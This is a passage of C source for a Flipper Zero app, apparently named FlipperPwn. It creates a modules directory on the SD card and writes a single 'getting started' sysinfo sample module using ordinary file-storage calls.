    uint16_t written = storage_file_write(f, content, (uint16_t)len);
    storage_file_close(f);
    storage_file_free(f);
    return (written == (uint16_t)len);
}

void fpwn_modules_write_samples(FPwnApp* app) {
    /* Ensure the modules directory exists */
    storage_simply_mkdir(app->storage, FPWN_MODULES_DIR);

    /* Write a single "getting started" module if no .fpwn files exist yet.
     * All other sample modules are distributed as standalone .fpwn files
     * in the release package — copy them to SD:/flipperpwn/modules/. */
    char path[FPWN_PATH_LEN];
    snprintf(path, sizeof(path), "%s/sysinfo.fpwn", FPWN_MODULES_DIR);
    fpwn_write_sample_file(app->storage, path, SAMPLE_SYSINFO);
}
/* END — previously 43 sample modules were embedded here (~33 KB).
 * They now ship as standalone .fpwn files alongside the FAP. */
